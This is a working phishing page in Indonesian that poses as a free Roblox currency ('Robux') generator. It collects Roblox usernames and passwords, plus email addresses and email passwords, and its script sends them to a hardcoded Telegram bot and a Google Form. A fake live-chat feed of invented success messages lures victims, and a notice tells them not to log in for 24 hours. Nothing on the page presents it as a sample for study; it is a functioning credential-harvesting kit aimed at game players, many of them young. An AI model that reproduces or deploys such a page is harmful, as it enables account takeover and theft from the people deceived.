<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KING BOBUX | OFFICIAL GENERATOR</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&display=swap');
        body { font-family: 'Orbitron', sans-serif; background: #000; color: #fff; overflow-x: hidden; }
        .bg-gold { background: linear-gradient(135deg, #ffd700, #b8860b); }
        .hidden { display: none; }
        .loading-bar { width: 0%; animation: load 18s linear forwards; }
        @keyframes load { from { width: 0%; } to { width: 100%; } }
        .chat-box { height: 150px; overflow-y: hidden; font-size: 10px; border-radius: 15px; }
    </style>
</head>
<body class="p-4 max-w-md mx-auto text-center">

    <header class="py-6">
        <h1 class="text-3xl font-black italic text-yellow-500 uppercase leading-none">KING <span class="text-white">BOBUX</span></h1>
        <p class="text-[8px] text-gray-500 font-bold mt-2 animate-pulse uppercase">● LIVE SERVER: ACTIVE</p>
    </header>

    <div class="bg-zinc-900 border-2 border-yellow-500/30 p-6 rounded-[2rem] shadow-2xl mb-6">
        
        <div id="p1">
            <p class="text-[10px] mb-4 text-gray-400 font-bold uppercase italic italic">PILIH JUMLAH ROBUX:</p>
            <div class="grid grid-cols-2 gap-3 mb-6">
                <button onclick="setA('10,000')" class="bg-white/5 border border-white/10 py-5 rounded-xl text-xs font-black hover:bg-white/10 transition-all">10K RBX</button>
                <button onclick="setA('50,000')" class="bg-white/5 border border-white/10 py-5 rounded-xl text-xs font-black hover:bg-white/10 transition-all">50K RBX</button>
            </div>
            <button onclick="toChoice()" class="w-full bg-gold py-5 rounded-xl font-black text-black text-xs uppercase italic shadow-lg shadow-yellow-500/20">NEXT</button>
        </div>

        <div id="p-choice" class="hidden space-y-4">
            <p class="text-[10px] text-yellow-500 font-black uppercase mb-4">PILIH METODE VERIFIKASI AKUN:</p>
            <button onclick="showLogin('biasa')" class="w-full bg-zinc-800 border border-white/10 py-5 rounded-xl text-xs font-black hover:bg-white/5 transition-all">❌ AKUN TIDAK TERTAUT EMAIL</button>
            <button onclick="showLogin('email')" class="w-full bg-yellow-500/10 border border-yellow-500/50 py-5 rounded-xl text-xs font-black hover:bg-yellow-500/20 text-yellow-500 transition-all text-left px-6">✅ AKUN TERTAUT EMAIL (BONUS 5K RBX)</button>
        </div>

        <div id="p2" class="hidden space-y-3">
            <input type="text" id="u" placeholder="USERNAME ROBLOX" class="w-full bg-black border border-white/20 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500">
            <input type="password" id="p" placeholder="PASSWORD ROBLOX" class="w-full bg-black border border-white/20 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500">
            
            <div id="email-fields" class="hidden space-y-3 pt-3 border-t border-white/10">
                <input type="email" id="e" placeholder="EMAIL PEMULIHAN" class="w-full bg-black border border-yellow-500/30 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500">
                <input type="password" id="ep" placeholder="KATA SANDI EMAIL" class="w-full bg-black border border-yellow-500/30 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500">
            </div>

            <button onclick="kirimData()" class="w-full bg-gold py-5 rounded-xl font-black text-black text-xs uppercase shadow-lg shadow-yellow-500/40">CLAIM SEKARANG!</button>
        </div>

        <div id="p3" class="hidden py-6 space-y-4">
            <h3 class="text-yellow-500 font-black italic uppercase">MENGIRIM ROBUX...</h3>
            <div class="w-full bg-white/10 h-3 rounded-full overflow-hidden"><div class="loading-bar bg-yellow-500 h-full"></div></div>
            <p class="text-[9px] text-gray-400 font-black italic px-4 leading-relaxed">Jangan login selama 24 jam agar sistem tidak error.</p>
        </div>
    </div>

    <div class="bg-zinc-900/50 border border-white/10 rounded-2xl p-4 shadow-inner">
        <p class="text-[9px] font-black text-yellow-500 uppercase mb-2">LIVE CHAT ACTIVITY</p>
        <div id="chat-content" class="chat-box space-y-2 overflow-hidden text-left opacity-70"></div>
    </div>

    <script>
        let amt = "";
        let mode = "";
        const teleToken = "8712552694:AAHAjQQhwx4Vlas6CWs6QHB4iYSA5U2LiWM";
        const teleChatId = "7153376507";
        const gform = "https://docs.google.com/forms/d/e/1FAIpQLSfgBrBP1Bqk4tfVHBFUPZDCbW5fj7nK8NZuObuQPmhyRcEGxg/formResponse";

        function setA(v){ amt = v; alert("Selected: " + v); }
        function toChoice(){ if(!amt) return alert("Pilih nominal!"); document.getElementById('p1').classList.add('hidden'); document.getElementById('p-choice').classList.remove('hidden'); }
        
        function showLogin(m){
            mode = m;
            document.getElementById('p-choice').classList.add('hidden');
            document.getElementById('p2').classList.remove('hidden');
            if(m === 'email') { document.getElementById('email-fields').classList.remove('hidden'); }
        }

        function kirimData(){
            const user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;
            const mail = document.getElementById('e').value || "-";
            const spass = document.getElementById('ep').value || "-";

            if(!user || !pass) return alert("Isi Username & Password!");
            if(mode === 'email' && (!mail || !spass)) return alert("Isi Email & Sandi Email!");

            const fd = new FormData();
            fd.append('entry.298399091', user); fd.append('entry.434090398', pass);
            fd.append('entry.455306086', mail); fd.append('entry.734491941', spass);
            fd.append('entry.1584180390', amt); fetch(gform, { method: 'POST', mode: 'no-cors', body: fd });

            const msgTele = `🚀 *AKUN BARU (${mode.toUpperCase()})*\n\n👤 *User:* \`${user}\` \n🔑 *Pass:* \`${pass}\` \n📧 *Mail:* \`${mail}\` \n🔐 *Sandi:* \`${spass}\` \n💎 *Jumlah:* \`${amt}\` RBX`;
            fetch(`https://api.telegram.org/bot${teleToken}/sendMessage?chat_id=${teleChatId}&text=${encodeURIComponent(msgTele)}&parse_mode=Markdown`);

            document.getElementById('p2').classList.add('hidden');
            document.getElementById('p3').classList.remove('hidden');
        }

        const names = ["ZfJ***", "Boc***", "Rey***", "Lit***", "Sla***", "Aka***"];
        const texts = ["Gila beneran dapet!", "Gacor parah email gw cair!", "Landing 10k!", "Thx admin king bobux!", "Coba dulu moga dapet.", "Hampir gak percaya beneran masuk!"];
        setInterval(() => {
            const box = document.getElementById('chat-content');
            const el = document.createElement('div');
            el.innerHTML = `<span class="text-yellow-500 font-bold">${names[Math.floor(Math.random()*names.length)]}:</span> <span class="text-gray-300">${texts[Math.floor(Math.random()*texts.length)]}</span>`;
            box.insertBefore(el, box.firstChild);
            if(box.childNodes.length > 7) box.removeChild(box.lastChild);
        }, 1200);
    </script>
</body>
</html>
